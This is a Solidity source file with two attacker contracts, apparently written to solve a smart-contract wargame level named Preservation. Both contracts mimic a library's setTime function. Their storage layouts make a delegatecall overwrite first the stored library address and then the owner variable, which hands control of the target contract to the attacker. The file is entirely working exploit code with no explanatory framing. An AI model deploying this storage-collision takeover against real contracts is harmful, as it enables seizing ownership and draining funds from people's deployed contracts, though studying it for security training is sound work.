// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ILibraryContract {
    function setTime(uint256 _time) external;
}

contract PreservationAttacker1 is ILibraryContract {
    uint256 public placeHolder1;
    uint256 public hackTimeZone2Library;

    function setTime(uint256 _time) external override {
        hackTimeZone2Library = _time;
    }
}

contract PreservationAttacker2 is ILibraryContract {
    uint256 public placeHolder1;
    uint256 public placeHolder2;
    uint256 public hackOwner;

    function setTime(uint256 _time) external override {
        hackOwner = _time;
    }
}